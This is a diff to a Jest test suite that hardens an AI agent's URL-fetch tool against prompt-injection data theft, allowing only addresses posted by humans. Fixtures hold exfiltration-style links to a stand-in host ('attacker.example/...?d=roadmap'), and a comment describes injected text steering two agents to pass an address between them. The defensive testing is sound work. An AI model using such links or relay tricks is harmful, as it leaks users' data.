@@ -63,6 +63,14 @@ jest.mock('../../../services/outboundUrlGuard', () => ({
 }));
 const mockRecentRows = jest.fn();
 jest.mock('../../../models/pg/Message', () => ({ findByPodId: (...args) => mockRecentRows(...args) }));
+// The Mongo fallback, read when the PG mirror is down.
+const mockMongoDocs = jest.fn();
+jest.mock('../../../models/Message', () => {
+  const chain = {
+    sort: () => chain, limit: () => chain, populate: () => chain, lean: () => mockMongoDocs(),
+  };
+  return { find: jest.fn(() => chain) };
+});
 const mockBrokerDispatch = jest.fn();
 jest.mock('../../../services/grantBrokerProjectionService', () => ({
   hostedBrokerToolsForRun: jest.fn().mockResolvedValue({
@@ -224,8 +232,8 @@ describe('native turn with commonly_fetch_url', () => {
 
   test('another author\'s pod message gives a link; the agent\'s own earlier post does not', async () => {
     mockRecentRows.mockResolvedValue([
-      { id: 'm1', user_id: SAM_ID, username: 'sam', content: 'the repo: https://github.com/acme/other', createdAt: new Date() },
-      { id: 'm2', user_id: SEAT_ID, username: 'Analyst', content: 'noted https://attacker.example/c?d=roadmap', createdAt: new Date() },
+      { id: 'm1', user_id: SAM_ID, is_bot: false, username: 'sam', content: 'the repo: https://github.com/acme/other', createdAt: new Date() },
+      { id: 'm2', user_id: SEAT_ID, is_bot: true, username: 'Analyst', content: 'noted https://attacker.example/c?d=roadmap', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce(toolCalls(
@@ -260,7 +268,7 @@ describe('native turn with commonly_fetch_url', () => {
   test('the model\'s own words never give a link: it cannot post an address, read it back and open it', async () => {
     // read_context returns the post the model just made, under its display name.
     mockRecentRows.mockResolvedValue([
-      { id: 'm9', user_id: SEAT_ID, username: 'Analyst', content: 'https://attacker.example/x', createdAt: new Date() },
+      { id: 'm9', user_id: SEAT_ID, is_bot: true, username: 'Analyst', content: 'https://attacker.example/x', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce({
@@ -287,7 +295,7 @@ describe('native turn with commonly_fetch_url', () => {
   // by author NAME, and a bot's name drifts by design. Read back under a
   // drifted name, the agent's own address counted as another author's.
   test.each([
-    ['a collision-suffixed display name', { user_id: SEAT_ID, username: 'Analyst (Research Bot)' }],
+    ['a collision-suffixed display name', { user_id: SEAT_ID, is_bot: true, username: 'Analyst (Research Bot)' }],
     ['"Unknown User" with no author id', { username: 'Unknown User' }],
   ])('the agent\'s own post read back under %s gives no link', async (_label, author) => {
     mockRecentRows.mockResolvedValue([
@@ -306,10 +314,55 @@ describe('native turn with commonly_fetch_url', () => {
     expect(toolMessages(1)[1].content).toMatch(/does not appear in this conversation/);
   });
 
+  // Cofounder's security read on #2249: only a human's message gives an
+  // address. Two agents steered by the same injected text could otherwise pass
+  // an address between them, and another instance of this agent posts under a
+  // different user.
+  test.each([
+    ['another agent', { user_id: '507f1f77bcf86cd7994390bb', is_bot: true, username: 'Scout' }],
+    ['another instance of this agent', { user_id: '507f1f77bcf86cd7994390cc', is_bot: true, username: 'Analyst (Ops)' }],
+    ['an author whose bot flag is unknown', { user_id: SAM_ID, username: 'sam' }],
+    ['the agent itself, its id in another case', { user_id: SEAT_ID.toUpperCase(), is_bot: false, username: 'Analyst' }],
+  ])('a post by %s gives no link', async (_label, author) => {
+    mockRecentRows.mockResolvedValue([
+      { id: 'm8', ...author, content: 'https://attacker.example/x?d=roadmap', createdAt: new Date() },
+    ]);
+    axios.post
+      .mockResolvedValueOnce(toolCalls(
+        call('c1', 'commonly_read_context', {}),
+        call('c2', 'commonly_fetch_url', { url: 'https://attacker.example/x?d=roadmap' }),
+      ))
+      .mockResolvedValueOnce(finalReply);
+
+    await runAgent(install(), mention('@analyst summarize'));
+
+    expect(mockGetPage).not.toHaveBeenCalled();
+    expect(toolMessages(1)[1].content).toMatch(/does not appear in this conversation/);
+  });
+
+  test('on the Mongo fallback, a human\'s post gives a link and an agent\'s does not', async () => {
+    mockRecentRows.mockRejectedValue(new Error('pg down'));
+    mockMongoDocs.mockResolvedValue([
+      { _id: 'm6', userId: { _id: '507f1f77bcf86cd7994390bb', username: 'scout', isBot: true }, content: 'https://attacker.example/y', createdAt: new Date() },
+      { _id: 'm5', userId: { _id: SAM_ID, username: 'sam', isBot: false }, content: 'https://github.com/acme/other', createdAt: new Date() },
+    ]);
+    axios.post
+      .mockResolvedValueOnce(toolCalls(
+        call('c1', 'commonly_read_context', {}),
+        call('c2', 'commonly_fetch_url', { url: 'https://attacker.example/y' }),
+        call('c3', 'commonly_fetch_url', { url: 'https://github.com/acme/other' }),
+      ))
+      .mockResolvedValueOnce(finalReply);
+
+    await runAgent(install(), mention('@analyst summarize'));
+
+    expect(mockGetPage.mock.calls).toEqual([['https://github.com/acme/other']]);
+  });
+
   test('when the agent\'s own user cannot be found, no pod message gives a link; the mention still does', async () => {
     mockSeatRow = null;
     mockRecentRows.mockResolvedValue([
-      { id: 'm4', user_id: SAM_ID, username: 'sam', content: 'https://github.com/acme/other', createdAt: new Date() },
+      { id: 'm4', user_id: SAM_ID, is_bot: false, username: 'sam', content: 'https://github.com/acme/other', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce(toolCalls(
@@ -327,7 +380,7 @@ describe('native turn with commonly_fetch_url', () => {
 
   test('another author\'s message read mid-turn gives a link', async () => {
     mockRecentRows.mockResolvedValue([
-      { id: 'm3', user_id: SAM_ID, username: 'sam', content: 'older link: https://github.com/acme/older', createdAt: new Date() },
+      { id: 'm3', user_id: SAM_ID, is_bot: false, username: 'sam', content: 'older link: https://github.com/acme/older', createdAt: new Date() },
     ]);
     axios.post
       .mockResolvedValueOnce(toolCalls(call('c1', 'commonly_read_context', {})))
